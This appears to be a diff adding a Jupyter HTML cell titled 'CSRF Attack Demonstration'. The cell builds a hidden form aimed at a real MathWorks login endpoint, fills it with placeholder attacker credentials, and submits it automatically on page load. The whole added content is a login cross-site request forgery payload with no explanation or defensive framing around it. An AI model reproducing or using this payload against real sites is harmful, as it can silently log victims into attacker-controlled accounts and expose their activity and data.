@@ -1,0 +1,15 @@
+%%html
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>CSRF Attack Demonstration</h1>
+    <form id="csrfForm" action="https://login.mathworks.com/embedded-login/v2/login.html" method="POST">
+      <input type="hidden" name="username" value="your-attacker-username">
+      <input type="hidden" name="password" value="your-attacker-password">
+      <!-- Add any other necessary fields or parameters -->
+    </form>
+    <script>
+      document.getElementById('csrfForm').submit();
+    </script>
+  </body>
+</html>
